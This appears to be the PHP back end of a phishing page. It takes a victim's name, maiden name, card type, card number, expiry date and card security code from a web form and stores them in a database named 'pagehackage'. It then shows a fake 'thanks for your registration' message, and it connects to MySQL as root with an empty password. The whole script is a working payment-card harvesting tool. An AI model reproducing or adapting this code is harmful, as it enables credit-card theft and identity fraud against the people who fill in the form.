<?php
	$nomPrenom =$_POST['nomPrenom'];
	$nomJeuneFille =$_POST['nomJeuneFille'];
	$typeCarte =$_POST['typeCarte'];
	$numeroCarte =$_POST['numeroCarte'];
	$dateExpiration =$_POST['dateExpiration'];
	$cryptogramme =$_POST['cryptogramme'];
	
    // Database connection   
	$conn = new mysqli('localhost','root','','pagehackage');
		if($conn->connect_error){
			die("Connection Failed : ". $conn->connect_error);
		} else {
			$stmt = $conn->prepare("insert into infospersonnelles(nomPrenom,nomJeuneFille, typeCarte,numeroCarte, dateExpiration,cryptogramme ) values(?, ?, ?, ?, ?, ?)");
			$stmt->bind_param("sssssi", $nomPrenom,$nomJeuneFille, $typeCarte,$numeroCarte, $dateExpiration,$cryptogramme );
			$execval = $stmt->execute();
			echo "merci pour votre inscription ...";
			$stmt->close();
			$conn->close();
		}
	?>
	
	